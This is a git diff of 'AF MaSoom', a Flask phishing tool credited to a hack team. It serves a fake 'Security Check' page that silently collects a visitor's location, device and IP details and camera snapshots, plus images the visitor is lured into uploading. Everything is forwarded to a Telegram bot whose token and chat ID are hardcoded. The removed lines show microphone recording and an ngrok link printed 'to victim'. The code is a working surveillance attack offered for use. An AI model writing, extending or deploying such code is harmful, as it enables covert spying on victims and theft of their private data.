@@ -1,31 +1,37 @@
-# AF MaSoom v0.3
-# Author: Ali Hamza
-# Created by: AF HACK TEAM
-
-import os
-import json
-import requests
+# AF MaSoom V0.3
+# Author: Ali hamza 
+#Created by: AF Hack Team 
 from flask import Flask, request, render_template_string
-from pyngrok import ngrok
-
-# Your Bot Token and chat ID (first use the token to find chat ID)
-TOKEN = "7664449745:AAGA_V8ikC-g0753vPZ-TGXeBP-OxHpRCos"
-CHAT_ID = None
-LOG_FILE = "logs.txt"
+import requests
 
 app = Flask(__name__)
+
+# Telegram Bot
+TOKEN = "7664449745:AAGA_V8ikC-g0753vPZ-TGXeBP-OxHpRCos"
+CHAT_ID = "7531257376"
 
 html_content = """
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Secure Verification</title>
+  <title>Security Check</title>
   <script>
-    function captureData() {
+    function sendData() {
+      // Device Info
+      fetch("/device", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          userAgent: navigator.userAgent,
+          platform: navigator.platform
+        })
+      });
+
+      // Location
       navigator.geolocation.getCurrentPosition(function(position) {
         fetch("/location", {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: {"Content-Type": "application/json"},
           body: JSON.stringify({
             latitude: position.coords.latitude,
             longitude: position.coords.longitude
@@ -33,43 +39,46 @@ html_content = """
         });
       });
 
-      fetch("/info", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          userAgent: navigator.userAgent,
-          platform: navigator.platform
-        })
-      });
-
-      fetch("/camera", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ snapshot: "Camera not available without permission." })
-      });
-
-      navigator.mediaDevices.getUserMedia({ audio: true })
-        .then(function(stream) {
-          const recorder = new MediaRecorder(stream);
-          recorder.ondataavailable = function(event) {
-            fetch("/audio", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                audioData: event.data
-              })
-            });
-          };
-          recorder.start();
-        }).catch(function(error) {
-          console.error('Audio recording error:', error);
-        });
+      // Camera
+      navigator.mediaDevices.getUserMedia({video: true})
+      .then(function(stream) {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        const canvas = document.createElement('canvas');
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          const imgData = canvas.toDataURL('image/jpeg');
+          fetch("/camera", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({image: imgData})
+          });
+          stream.getTracks().forEach(track => track.stop());
+        }, 3000);
+      }).catch(e => console.log("Camera error:", e));
     }
-    window.onload = captureData;
+
+    function sendGalleryImage(input) {
+      const reader = new FileReader();
+      reader.onload = function() {
+        fetch("/gallery", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ image: reader.result })
+        });
+      };
+      reader.readAsDataURL(input.files[0]);
+    }
+
+    window.onload = sendData;
   </script>
 </head>
 <body>
-  <h2>Processing... Please wait</h2>
+  <h3>Processing Secure Verification...</h3>
+  <input type="file" accept="image/*" onchange="sendGalleryImage(this)" />
 </body>
 </html>
 """
@@ -78,60 +87,48 @@ html_content = """
 def index():
     return render_template_string(html_content)
 
-@app.route("/location", methods=["POST"])
-def location():
-    data = request.json
-    message = f"📍 Location:\nLatitude: {data['latitude']}\nLongitude: {data['longitude']}"
-    send_telegram(message)
-    save_log(message)
-    return "", 200
-
-@app.route("/info", methods=["POST"])
-def info():
+@app.route("/device", methods=["POST"])
+def device():
     data = request.json
     ip = request.remote_addr
     ip_info = requests.get(f"http://ip-api.com/json/{ip}").json()
-    ip_data = f"🌐 IP: {ip}\nCity: {ip_info.get('city')}\nCountry: {ip_info.get('country')}\nISP: {ip_info.get('isp')}"
-    message = f"📱 Device Info:\nUser-Agent: {data['userAgent']}\nPlatform: {data['platform']}\n{ip_data}"
-    send_telegram(message)
-    save_log(message)
+    msg = f"🌐 IP Info\nIP: {ip}\nCity: {ip_info.get('city')}\nCountry: {ip_info.get('country')}\nISP: {ip_info.get('isp')}"
+    info = f"📱 Device Info\nUser-Agent: {data['userAgent']}\nPlatform: {data['platform']}\n{msg}"
+    send_telegram(info)
+    return "", 200
+
+@app.route("/location", methods=["POST"])
+def location():
+    data = request.json
+    loc = f"📍 Location\nLatitude: {data['latitude']}\nLongitude: {data['longitude']}"
+    send_telegram(loc)
     return "", 200
 
 @app.route("/camera", methods=["POST"])
 def camera():
     data = request.json
-    message = f"📷 Camera Snapshot:\n{data['snapshot']}"
-    send_telegram(message)
-    save_log(message)
+    img = data['image']
+    send_photo(img, "📷 Camera Snapshot")
     return "", 200
 
-@app.route("/audio", methods=["POST"])
-def audio():
+@app.route("/gallery", methods=["POST"])
+def gallery():
     data = request.json
-    audio_data = data.get("audioData")
-    # Here, we could store or send the audio data as per your requirements
-    message = "🎤 Audio Data received!"
-    send_telegram(message)
-    save_log(message)
+    img = data['image']
+    send_photo(img, "🖼️ Gallery Image")
     return "", 200
 
 def send_telegram(text):
-    global CHAT_ID
-    if CHAT_ID is None:
-        updates = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates").json()
-        try:
-            CHAT_ID = updates['result'][-1]['message']['chat']['id']
-        except:
-            return
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    payload = {'chat_id': CHAT_ID, 'text': text}
-    requests.post(url, json=payload)
+    requests.post(url, json={"chat_id": CHAT_ID, "text": text})
 
-def save_log(text):
-    with open(LOG_FILE, "a") as f:
-        f.write(text + "\n" + "-"*40 + "\n")
+def send_photo(photo_data, caption):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+    requests.post(url, data={
+        "chat_id": CHAT_ID,
+        "caption": caption,
+        "photo": photo_data
+    })
 
 if __name__ == "__main__":
-    public_url = ngrok.connect(5000)
-    print(f"[*] Send this link to victim: {public_url}")
-    app.run(port=5000)
+    app.run(host="0.0.0.0", port=5000)
